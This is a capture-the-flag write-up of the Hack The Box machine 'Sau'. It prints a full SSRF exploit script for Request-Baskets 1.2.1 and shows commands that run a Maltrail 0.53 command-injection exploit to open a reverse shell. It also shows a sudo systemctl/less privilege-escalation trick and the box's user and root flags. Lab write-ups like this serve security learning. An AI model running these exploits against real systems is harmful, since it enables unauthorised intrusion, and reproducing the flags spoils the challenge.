+++
title = "HTB - Sau"
date = 2026-01-16
+++

Completed 10/18/24

Sau is a simple box that chains together a few web-based CVE's before a simple - but creative - privilege escalation vector. Let's get into it.

### Scan
```
# Nmap 7.94SVN scan initiated Fri Oct 18 17:14:42 2024 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/li0t/Desktop/HTB/Sau/results/10.10.11.224/scans/_full_tcp_nmap.txt -oX /home/li0t/Desktop/HTB/Sau/results/10.10.11.224/scans/xml/_full_tcp_nmap.xml 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up, received user-set (0.12s latency).
Scanned at 2024-10-18 17:14:43 EDT for 588s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 18 Oct 2024 21:20:14 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Hello, Help, Kerberos, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 18 Oct 2024 21:19:46 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 18 Oct 2024 21:19:46 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=9%D=10/18%Time=6712D0F2%P=aarch64-unknown-lin
SF:ux-gnu%r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2018\
SF:x20Oct\x202024\x2021:19:46\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x2
SF:0href=\"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP
SF:/1\.0\x20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2018\
SF:x20Oct\x202024\x2021:19:46\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(R
SF:TSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Hello,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLv23SessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConn
SF:ection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,
SF:"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Fri,\x2
SF:018\x20Oct\x202024\x2021:20:14\x20GMT\r\nContent-Length:\x2075\r\n\r\ni
SF:nvalid\x20basket\x20name;\x20the\x20name\x20does\x20not\x20match\x20pat
SF:tern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\n");
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/18%OT=22%CT=1%CU=30905%PV=Y%DS=2%DC=T%G=Y%TM=671
OS:2D20F%P=aarch64-unknown-linux-gnu)SEQ(SP=FE%GCD=1%ISR=110%TI=Z%CI=Z%II=I
OS:%TS=A)SEQ(SP=FF%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=
OS:M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WI
OS:N(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FA
OS:F0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3
OS:(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 40.346 days (since Sun Sep  8 09:06:52 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   117.26 ms 10.10.14.1
2   119.05 ms 10.10.11.224

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 18 17:24:31 2024 -- 1 IP address (1 host up) scanned in 589.04 seconds
```


### Enumeration

Our scan comes back with interesting information on port `55555`. When we visit the page, we come across a dashboard to create baskets that collect HTTP requests. These requests can be inspected by RESTful API's or through Web UI's, and seems to be a continuation of the functionality provided by the RequestBin service. 

<img alt="Image" async src="images/Screenshot 2026-01-16 at 14.30.21.png" width="800px"></img>

There's also a software version number in the bottom corner: `1.2.1`. 

Doing research, there seems to also be a SSRF vulnerability with the software. Imene Allouche has a great article on medium explaining the crux of the issue [here](https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7). 

To keep is short, we can gain access to sensitive information by carefully crafting API requests by exploiting the `api/baskets/{name}` component of the software. During the creation of a basket, we can forward our request to alternative services that may be configured to only run locally on the machine.

There's an exploit POC from Iyaad Luqman:

```bash
# Exploit Title: Request-Baskets v1.2.1 - Server-side request forgery (SSRF)    
# Exploit Author: Iyaad Luqman K (init_6)    
# Application: Request-Baskets v1.2.1    
# Tested on: Ubuntu 22.04    
# CVE: CVE-2023-27163    
    
    
# PoC    
#!/bin/bash    
    
    
if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then    
help="Usage: exploit.sh <URL> <TARGET>\n\n";    
help+="Arguments:\n" \    
help+=" URL main path (/) of the server (eg. http://127.0.0.1:5000/)\n";    
help+=" TARGET";    
    
echo -e "$help";    
exit 1;    
fi    
    
URL=$1    
ATTACKER_SERVER=$2    
    
if [ "${URL: -1}" != "/" ]; then    
URL="$URL/";    
fi;    
    
BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");    
    
API_URL="$URL""api/baskets/$BASKET_NAME";    
    
PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";    
    
echo "> Creating the \"$BASKET_NAME\" proxy basket...";    
    
if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then    
echo "> FATAL: Could not properly request $API_URL. Is the server online?";    
exit 1;    
fi;    
    
BASKET_URL="$URL$BASKET_NAME";    
    
echo "> Basket created!";    
echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";    
    
if ! jq --help 1>/dev/null; then    
echo "> Response body (Authorization): $response";    
else    
echo "> Authorization: $(echo "$response" | jq -r ".token")";    
fi;    
    
exit 0;
```

The code automates the exploitation process by creating a new basket via the application's API and configuring its `forward_url` property to point toward a specified target server. By setting the `proxy_response` flag to true, the script effectively turns the instance into a transparent proxy. 

Create and run the POC:

`bash ./exploit.sh http://10.129.229.26:55555 http://127.0.0.1:80`

Visit the created basket: `http://10.129.229.26:55555/kvqomb`

### Initial Access

Once there, we find a `maltrail 0.53` instance. 

<img alt="Image" async src="images/Screenshot 2026-01-16 at 15.04.04.png" width="800px"></img>

In a similar fashion, we find a POC while searching for version information from `spookier` [here](https://github.com/spookier/Maltrail-v0.53-Exploit.git). This exploit revolves around unsanitized input for the `username` parameter in the software, allowing us remote code execution on the box. The exploit uses the `subprocess.check_output()` function to execute commands that log the username provided by the user. We can append commands to the username by passing them after a semicolon in the parameter. The code uses an encoded reverse shell to give access onto the machine running the vulnerable software.

Clone the exploit to working space, and run: `python3 exploit.py 10.10.15.100 4444 http://10.129.229.26:55555/kvqomb`

<img alt="Image" async src="images/Screenshot 2026-01-16 at 15.20.10.png" width="800px"></img>

On the box as `puma` user. Stabilize the shell:

`TARGET: python3 -c 'import pty; pty.spawn("/bin/bash")'`
`TARGET: BACKGROUND THE PROCESS WITH ^Z`
`HOST: stty raw -echo;fg`
`TARGET: export TERM="xterm"`

USER:`ba20dae507d7075ae421b1c8ca77e9ab`

### Privilege Escalation

Once done, running `sudo -l` reveals we can analyze and run the `systemctl status trail.service` of the server

<img alt="Image" async src="images/Screenshot 2026-01-16 at 15.24.07.png" width="800px"></img>

When we run: `sudo /usr/bin/systemctl status trail.service`, the output is too large for the window, passing the rest of the output to less. We can verify by seeing where the text hangs.

<img alt="Image" async src="images/Screenshot 2026-01-16 at 15.36.29.png" width="800px"></img>

Running `!sh` while in less will drop us into a higher privilege shell, where we can grab the flag.

ROOT: `76133ad4b7bb78cdd4ac1dbec5b836e6`